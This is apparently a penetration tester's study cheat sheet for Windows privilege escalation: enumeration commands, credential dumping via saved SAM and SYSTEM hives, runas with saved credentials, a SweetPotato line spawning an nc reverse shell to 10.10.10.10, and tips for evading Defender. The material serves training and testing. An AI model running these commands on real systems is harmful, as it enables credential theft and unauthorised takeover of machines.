---
description: >-
  at the end of the day, you have to picture the way. these tools can only guide
  you so much
---

# Windows PrivEsc

HKCU - Current User\
HKLM - Local Machine

{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html" %}
Whole picture + Weak Services
{% endembed %}

{% embed url="https://benheater.com/thm-windows-privesc/" %}
No nonsense - straight to business
{% endembed %}

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/" %}
Weak Registry
{% endembed %}

Host file -`C:\Windows\System32\drivers\etc\hosts`

## Commands

### Basic Info gathering

```
powershell -ep bypass
. .\Downloads\PowerView.ps1

systeminfo - (look for latest hotfixes patched)
wmic qfe - check patch history (wmi - windows management instrumentation command line quick fix engineering)
wmic logicaldisk get caption,description,providername

findstr /B /C "string" - grep basically
icacls - ACL to files/directories
where /R c:\windows bash.exe

dir /R [Watch out for ADS (Alternate data streams) - good way to hide data]
more < hm.txt:root.txt

dir /A:H (ls -la of cmd.exe)
ls -force (ls -la of powershell)
```

### Reverse Shells

```
Powershell base64 encode reverse shell works most of the time
nc64.exe best run via cmd or powershell first (eg. cmd.exe /c nc64.exe ...)
```

### User Enumeration

```
whoami /priv /groups
net user (lists users on system)
net user $username - lists all relavant info of that user
net localgroup $groupname
```

### Network Enumeration

```
ipconfig
arp -a
netstat -ano | findstr LISTENING
```

### Passwords

```
findstr "/si password *.txt (look for string "password" in any txt file) 
```

{% code title="Keepass Database" %}
```
kpcli -kdb CEH.kdbx ls --group CEH --entries 
show -f [entry_number]
```
{% endcode %}

### AV Enumeration \[AMSI, AppLocker, Defender]

```
sc query windefend
sc query <query> see what services are running
netsh advfirewall firewall dump
netsh firewall show state/config
```

{% embed url="https://juggernaut-sec.com/applocker-bypass/" %}

## Automated Enumeration

{% hint style="info" %}
Run these from a SMB network share and not transfer to disk so Defender is not triggered
{% endhint %}

#### GO TO

* winPEAS.exe
* PowerUp.ps1
* SharpUp.exe
* Rubeus.exe
* Certify.exe

#### TO BE SOON

* Seatbelt.exe
* Watson.exe
* Sherlock.ps1 \[Deprecated]
* jaws-enum.ps1
* windows-exploit-suggester.py

## Passwords and Port Forwarding

```
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
```

Password exploits

*   Saved creds

    ```
    cmdkey /list
    runas /savecred /user:username C:\PrivEsc\reverse.exe
    ```
* Registry - The registry can be searched for keys and values that contain the word "password":
*   SAM (Security Account Manager)\
    SAM and SYSTEM can be found at `Windows/System32/config`

    ```
    reg save hklm\sam c:\Temp\sam
    reg save hklm\system c:\Temp\system
    ```
* Pass the hash - if `psexec` don't work, `smbexec.py` (half shell) or `wmiexec`

## Service Exploits

* Insecure Service Permissions
* Unquoted Service Path&#x20;
* Weak Registry Permissions (If writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users)

```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc #check perms
sc qc daclsvc
```

## Token Impersonation

Like cookies for your computer

* Delegate - created for logging into machine or RDP
* Impersonate - "non-interactive" such as attaching network drive or domain login script&#x20;

```
whoami /priv 
```

msfvenom to generate powershell payload, check how to do it wo meterpreter tho

**getsystem** - Magic way to become Admin, DO NOT SPAM

3 methods

* Named Pipe impersonation (In memory/admin)
* Named Pipe impersonation (Dropper/admin) - most risky, will be flagged by AV cus inserting dll into disk
* Token Impersonation (In memory/admin) - Needs SeDebugPriveleges

#### Potatoes

* SweetPotato - `.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"`

## Recycle Bin

```
View items in the bin

$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.Namespace(0xA)
$recycleBin.items() | Select-Object Name, Path

Restore deleted file

$recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)
$items = $recycleBin.Items()
$item = $items | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}
$documentsPath = [Environment]::GetFolderPath("Desktop")
$documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)
$documents.MoveHere($item)
```

## Exe Analysis

dnSpy the GOAT

<div align="left"><figure><img src="../.gitbook/assets/image (1) (1).png" alt="" width="563"><figcaption></figcaption></figure></div>

## Kernel Exploits

Most basic zero skill vector - this why make sure your systems are always updated

windows-exploit-suggester.py does bitsss (update db before using tho, run locally: feed it systeminfo data and it will run it against its db)

it has exploits for diff builds of windows

MS10-059 and others very popular: focus on privelege escalation vulns mentioned&#x20;

## Further ones to watch

* Executable Files - \[Ben `AlwaysInstallElevated`]
* Startup Applications - \[Ben `Autorun`]
* DLL Hijacking - \[Ben DLL]

## WSL

not sure if i need it at this point in time so do come back and check up
